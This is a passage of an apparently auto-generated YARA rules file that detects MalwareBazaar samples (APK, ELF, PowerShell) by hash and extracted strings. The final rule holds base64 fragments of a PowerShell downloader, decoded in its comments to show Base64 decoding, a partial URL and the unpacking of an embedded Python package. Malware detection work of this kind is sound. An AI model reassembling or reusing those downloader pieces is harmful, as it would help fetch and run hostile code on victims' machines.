      $s15 = "META-INF/androidx.viewpager_viewpager.version" fullword ascii
      $s16 = "##res/mipmap-xhdpi-v4/ic_launcher.png" fullword ascii
      $s17 = "META-INF/androidx.drawerlayout_drawerlayout.version" fullword ascii
      $s18 = "--res/mipmap-mdpi-v4/ic_launcher_foreground.png" fullword ascii
      $s19 = "META-INF/androidx.versionedparcelable_versionedparcelable.version" fullword ascii
      $s20 = "55res/drawable-v21/preference_list_divider_material.xml" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 16000KB and ( 8 of them )
      ) or ( all of them )
}

rule _228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e8848598579ef_f25b7f11e9f34ee5d91b3e07ba22925022e8b8b05c3ddf6672ae86e514_12 {
   meta:
      description = "evidences - from files 228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e8848598579ef.apk, f25b7f11e9f34ee5d91b3e07ba22925022e8b8b05c3ddf6672ae86e5144481cf.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e8848598579ef"
      hash2 = "f25b7f11e9f34ee5d91b3e07ba22925022e8b8b05c3ddf6672ae86e5144481cf"
   strings:
      $s1 = " restrict" fullword ascii
      $s2 = " volatile" fullword ascii
      $s3 = "St20bad_array_new_length" fullword ascii
      $s4 = "decltype(auto)" fullword ascii
      $s5 = " const" fullword ascii
      $s6 = "N10__cxxabiv129__pointer_to_member_type_infoE" fullword ascii /* Goodware String - occured 5 times */
   condition:
      ( ( uint16(0) == 0x4b50 or uint16(0) == 0x457f ) and filesize < 13000KB and ( all of them )
      ) or ( all of them )
}

rule _053c4a9eeca2f2436daf4273a9d8e2f680834e05a9d2eeabcebcfffa17679544_1e2a4d110fdc4f98687c5e06d2b0d4003929f679ffa05e7d26b2365e92_13 {
   meta:
      description = "evidences - from files 053c4a9eeca2f2436daf4273a9d8e2f680834e05a9d2eeabcebcfffa17679544.elf, 1e2a4d110fdc4f98687c5e06d2b0d4003929f679ffa05e7d26b2365e92000c10.elf, 5e5b205976b03a708da3dd55172bbd71ea8aae872016075f53b452329c484e3e.elf, 6a838a52943218de23020485f7401948a0c403a266d6b2a2ff1828b938544966.elf, 773f77b3dec9437e08cf0aff0871b179bef8d08506504a2a282a8353d1581973.elf, b12286ac0dc1a39351d63176d854a85cdff19e4b6f0254697bf3fcc17e5cfd18.elf, dde922a53c0fd584c17a298afd97676438d7755c364d5e909faef5b325986e35.elf, e3b0263b1545b58725dfde84e5d125ae87b0a14a16c364301af4d91cc068fa12.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "053c4a9eeca2f2436daf4273a9d8e2f680834e05a9d2eeabcebcfffa17679544"
      hash2 = "1e2a4d110fdc4f98687c5e06d2b0d4003929f679ffa05e7d26b2365e92000c10"
      hash3 = "5e5b205976b03a708da3dd55172bbd71ea8aae872016075f53b452329c484e3e"
      hash4 = "6a838a52943218de23020485f7401948a0c403a266d6b2a2ff1828b938544966"
      hash5 = "773f77b3dec9437e08cf0aff0871b179bef8d08506504a2a282a8353d1581973"
      hash6 = "b12286ac0dc1a39351d63176d854a85cdff19e4b6f0254697bf3fcc17e5cfd18"
      hash7 = "dde922a53c0fd584c17a298afd97676438d7755c364d5e909faef5b325986e35"
      hash8 = "e3b0263b1545b58725dfde84e5d125ae87b0a14a16c364301af4d91cc068fa12"
   strings:
      $s1 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s2 = "HOST: 255.255.255.255:1900" fullword ascii
      $s3 = "service:service-agent" fullword ascii
      $s4 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s5 = "ST: urn:dial-multiscreen-org:service:dial:1" fullword ascii
      $s6 = " default" fullword ascii
      $s7 = "watchdog" fullword ascii /* Goodware String - occured 16 times */
      $s8 = "Windows XP" fullword ascii /* Goodware String - occured 134 times */
      $s9 = "/proc/net/tcp" fullword ascii
      $s10 = "TeamSpeak" fullword ascii
      $s11 = "google" fullword ascii /* Goodware String - occured 1 times */
      $s12 = "bye bye" fullword ascii
      $s13 = "%s | 1" fullword ascii
      $s14 = "*Z$)Tl\"l{" fullword ascii
      $s15 = "F)K~.)" fullword ascii
      $s16 = "%s | 2" fullword ascii
      $s17 = "objectClass0" fullword ascii
      $s18 = "%s | 4" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _35f5e0a715ea16af70f2a1b9e8936681eb281a507c745307a7f3a23e054e0193_5ab7b4ebaf9794a98546bfa9f8606c523f625a9e251d1f6b244b39e491_14 {
   meta:
      description = "evidences - from files 35f5e0a715ea16af70f2a1b9e8936681eb281a507c745307a7f3a23e054e0193.unknown, 5ab7b4ebaf9794a98546bfa9f8606c523f625a9e251d1f6b244b39e491609f0a.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "35f5e0a715ea16af70f2a1b9e8936681eb281a507c745307a7f3a23e054e0193"
      hash2 = "5ab7b4ebaf9794a98546bfa9f8606c523f625a9e251d1f6b244b39e491609f0a"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                           ' */
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */
      $s3 = "DAAAAAAAAAAAA" ascii /* base64 encoded string '         ' */
      $s4 = "AAAAAAEBAAAA" ascii /* base64 encoded string '    @@  ' */
      $s5 = "fAAAAAAAAA" ascii /* base64 encoded string '|      ' */
      $s6 = "CAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '               ' */
      $s7 = "AAAAAAAAEBAAAA" ascii
      $s8 = "EAAAAAAAAA" ascii
      $s9 = "BAAAAAAAAEBAAAA" ascii
      $s10 = "AAAAAAAAAAAAAAABAAAAAAAAEAAAEAAAAAABAAABAA" ascii
      $s11 = "AAAAAAAAEBA" ascii
      $s12 = "AAAAAAAAAAAAAAAABAAAAAA" ascii
      $s13 = "AAAAAEBAAAAAAAAAAAAAAAAAAAEAAAAABAAAAAAAAA8DAAAAAAEAAAAAAAAAABAAAAEAAA4" ascii
      $s14 = "AAAAAAAAAAAAAAAAAAAAAAAA" ascii /* Goodware String - occured 1 times */
      $s15 = "AAAaAAAABA" ascii
      $s16 = "CAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s17 = "EAAACCAAAAAAAAAAAAAAACAAA" ascii
      $s18 = "AAACAAAAEA" ascii
      $s19 = "AAACAAAAAAAAAAAAAAAAAA" ascii
      $s20 = "05CAAAAAAAAAAAAAA" ascii
   condition:
      ( uint16(0) == 0x3d3d and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e8848598579ef_24ef1bdbb71aba9f8c50b5df76df9bd7c0f6782a50ef5caacbb3075f76_15 {
   meta:
      description = "evidences - from files 228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e8848598579ef.apk, 24ef1bdbb71aba9f8c50b5df76df9bd7c0f6782a50ef5caacbb3075f76845340.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e8848598579ef"
      hash2 = "24ef1bdbb71aba9f8c50b5df76df9bd7c0f6782a50ef5caacbb3075f76845340"
   strings:
      $s1 = "dialog_title" fullword ascii
      $s2 = "**res/drawable/abc_list_divider_material.xml" fullword ascii
      $s3 = "11res/drawable/preference_list_divider_material.xml" fullword ascii
      $s4 = "res/xml/preferences.xml" fullword ascii
      $s5 = "res/drawable/preference_list_divider_material.xmlu" fullword ascii
      $s6 = "res/drawable/preference_list_divider_material.xmlPK" fullword ascii
      $s7 = " Internet" fullword ascii
      $s8 = "res/drawable/abc_list_divider_material.xmlPK" fullword ascii
      $s9 = "res/xml/preferences.xmlPK" fullword ascii
      $s10 = "res/drawable/abc_list_divider_material.xmlu" fullword ascii
      $s11 = "action_settings" fullword ascii
      $s12 = "nh duy" fullword ascii /* Goodware String - occured 2 times */
      $s13 = "RIDATh" fullword ascii
      $s14 = "`(````d" fullword ascii
      $s15 = "qIDATX" fullword ascii
      $s16 = "res/drawable/abc_tab_indicator_material.xmluP" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _4b8fa4ed539cbe29b0a8d6b6bbc020405e6b2ad52e1fea5b29bc744271e9c110_78ccb1e5214f02d14da8065470de3f18a8a00409215c3197a062e4b4a0_16 {
   meta:
      description = "evidences - from files 4b8fa4ed539cbe29b0a8d6b6bbc020405e6b2ad52e1fea5b29bc744271e9c110.unknown, 78ccb1e5214f02d14da8065470de3f18a8a00409215c3197a062e4b4a0c1d4d8.unknown, b49fac5f49c011afbd02bb1c973259e28d29a027dc48a6b8c0a6a985c74ef4b0.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "4b8fa4ed539cbe29b0a8d6b6bbc020405e6b2ad52e1fea5b29bc744271e9c110"
      hash2 = "78ccb1e5214f02d14da8065470de3f18a8a00409215c3197a062e4b4a0c1d4d8"
      hash3 = "b49fac5f49c011afbd02bb1c973259e28d29a027dc48a6b8c0a6a985c74ef4b0"
   strings:
      $s1 = "BAAAAAAAAAAA" ascii /* base64 encoded string '        ' */ /* reversed goodware string 'AAAAAAAAAAAB' */
      $s2 = "DAAAAAAAAAAAAAAA" ascii /* base64 encoded string '           ' */
      $s3 = "AAAAAAAAAAAAE" ascii /* base64 encoded string '         ' */
      $s4 = "MzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMz" ascii /* base64 encoded string '333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333' */
      $s5 = "CAAAAAAAAAAAAAAA" ascii /* base64 encoded string '           ' */
      $s6 = "AAAAAAAAABAAABAAAAA" ascii
      $s7 = "AAAEAAAAAAAAAAAAAAAAAE" ascii
      $s8 = "AAAAAAAAAAa4" ascii
      $s9 = "AAAAAAAAAAAAAAAAAAAAEAAAAEAA4" ascii
      $s10 = "f4AAAAAeAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s11 = "CAAAEAAAAA" ascii
   condition:
      ( ( uint16(0) == 0x3d3d or uint16(0) == 0x413d ) and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _24ef1bdbb71aba9f8c50b5df76df9bd7c0f6782a50ef5caacbb3075f76845340_e666a26f17bf00c53923de4aba1a0633c851ad0c1c1dd0316ac53ca03b_17 {
   meta:
      description = "evidences - from files 24ef1bdbb71aba9f8c50b5df76df9bd7c0f6782a50ef5caacbb3075f76845340.apk, e666a26f17bf00c53923de4aba1a0633c851ad0c1c1dd0316ac53ca03ba8ab91.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "24ef1bdbb71aba9f8c50b5df76df9bd7c0f6782a50ef5caacbb3075f76845340"
      hash2 = "e666a26f17bf00c53923de4aba1a0633c851ad0c1c1dd0316ac53ca03ba8ab91"
   strings:
      $s1 = "android@android.com" fullword ascii
      $s2 = "android@android.com0" fullword ascii
      $s3 = "Android1\"0 " fullword ascii
      $s4 = "080229013346" ascii
      $s5 = "080229013346Z" fullword ascii
      $s6 = "350717013346" ascii
      $s7 = ":g7./d" fullword ascii
      $s8 = "350717013346Z0" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 23000KB and ( all of them )
      ) or ( all of them )
}

rule _21b9ee90d26b44f4044fd53567cddfe6d17317ee8ed9d6131f92b2a56ce36478_228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e884859_18 {
   meta:
      description = "evidences - from files 21b9ee90d26b44f4044fd53567cddfe6d17317ee8ed9d6131f92b2a56ce36478.apk, 228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e8848598579ef.apk, 24ef1bdbb71aba9f8c50b5df76df9bd7c0f6782a50ef5caacbb3075f76845340.apk, 4526effc1cd2597885c2787b1ca78a73ef17e066028a660ae70aa452292dc564.apk, e666a26f17bf00c53923de4aba1a0633c851ad0c1c1dd0316ac53ca03ba8ab91.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "21b9ee90d26b44f4044fd53567cddfe6d17317ee8ed9d6131f92b2a56ce36478"
      hash2 = "228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e8848598579ef"
      hash3 = "24ef1bdbb71aba9f8c50b5df76df9bd7c0f6782a50ef5caacbb3075f76845340"
      hash4 = "4526effc1cd2597885c2787b1ca78a73ef17e066028a660ae70aa452292dc564"
      hash5 = "e666a26f17bf00c53923de4aba1a0633c851ad0c1c1dd0316ac53ca03ba8ab91"
   strings:
      $s1 = "colorPrimaryDark" fullword ascii
      $s2 = "colorAccent" fullword ascii
      $s3 = "\"5iHK:" fullword ascii /* Goodware String - occured 1 times */
      $s4 = "colorControlNormal" fullword ascii
      $s5 = "colorPrimary" fullword ascii
      $s6 = "colorControlHighlight" fullword ascii
      $s7 = "classes.dexPK" fullword ascii
      $s8 = "e)Gy*P" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 23000KB and ( all of them )
      ) or ( all of them )
}

rule _228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e8848598579ef_e666a26f17bf00c53923de4aba1a0633c851ad0c1c1dd0316ac53ca03b_19 {
   meta:
      description = "evidences - from files 228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e8848598579ef.apk, e666a26f17bf00c53923de4aba1a0633c851ad0c1c1dd0316ac53ca03ba8ab91.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e8848598579ef"
      hash2 = "e666a26f17bf00c53923de4aba1a0633c851ad0c1c1dd0316ac53ca03ba8ab91"
   strings:
      $s1 = "Vg71* " fullword ascii
      $s2 = "AppTheme" fullword ascii
      $s3 = "META-INF/CERT.RSA3hb[" fullword ascii
      $s4 = "k`a`ddi`hllb" fullword ascii
      $s5 = "fa5`fd" fullword ascii
      $s6 = "klj`nh" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 13000KB and ( all of them )
      ) or ( all of them )
}

rule _b3c273fb7ef50d4e0e32f1316e065d6c658dc1b31571dd19d97f4db18dc02ef3_f4277859900c63f677886c9fa2c6ef6c5a53935f9b17490cd252de18e3_20 {
   meta:
      description = "evidences - from files b3c273fb7ef50d4e0e32f1316e065d6c658dc1b31571dd19d97f4db18dc02ef3.ps1, f4277859900c63f677886c9fa2c6ef6c5a53935f9b17490cd252de18e3c766d5.ps1"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "b3c273fb7ef50d4e0e32f1316e065d6c658dc1b31571dd19d97f4db18dc02ef3"
      hash2 = "f4277859900c63f677886c9fa2c6ef6c5a53935f9b17490cd252de18e3c766d5"
   strings:
      $s1 = "dQBaADIAbAAwAGEASABWAGkAZABYAE4AbABjAG0ATgB2AGIAbgBSAGwAYgBuAFEAdQBZADIAOQB0AEwAMgBkAG8AWgBEAGMANABjAHkAOQAzAGMAMgB4AHkAZABDADkA" ascii /* base64 encoded string 'u Z 2 l 0 a H V i d X N l c m N v b n R l b n Q u Y 2 9 t L 2 d o Z D c 4 c y 9 3 c 2 x y d C 9 ' */
      $s2 = "cwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBIAFIAMABjAEgATQA2AEwAeQA5AHkAWQBYAGMA" ascii /* base64 encoded string 's t e m . C o n v e r t ] : : F r o m B a s e 6 4 S t r i n g ( ' a H R 0 c H M 6 L y 9 y Y X c ' */
      $s3 = "cABGAG8AbABkAGUAcgAgACIAcAB5AHQAaABvAG4ALQAzAC4AMQAwAC4ANAAtAGUAbQBiAGUAZAAiADsAIAAkAFAAeQB0AGgAbwBuAFMAYwByAGkAcAB0AFUAcgBsAFMA" ascii /* base64 encoded string 'p F o l d e r   " p y t h o n - 3 . 1 0 . 4 - e m b e d " ;   $ P y t h o n S c r i p t U r l S ' */
      $s4 = "YgBlAGQALQBhAG0AZAA2ADQALgB6AGkAcAAiADsAIAAkAFAAeQB0AGgAbwBuAFUAbgBwAGEAYwBrAFAAYQB0AGgAPQBKAG8AaQBuAC0AUABhAHQAaAAgACQAVABlAG0A" ascii /* base64 encoded string 'b e d - a m d 6 4 . z i p " ;   $ P y t h o n U n p a c k P a t h = J o i n - P a t h   $ T e m ' */
      $s5 = "bwB1AHIAYwBlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkA" ascii /* base64 encoded string 'o u r c e = [ S y s t e m . T e x t . E n c o d i n g ] : : U T F 8 . G e t S t r i n g ( [ S y ' */
   condition:
      ( uint16(0) == 0x414a and filesize < 7KB and ( all of them )
      ) or ( all of them )
}
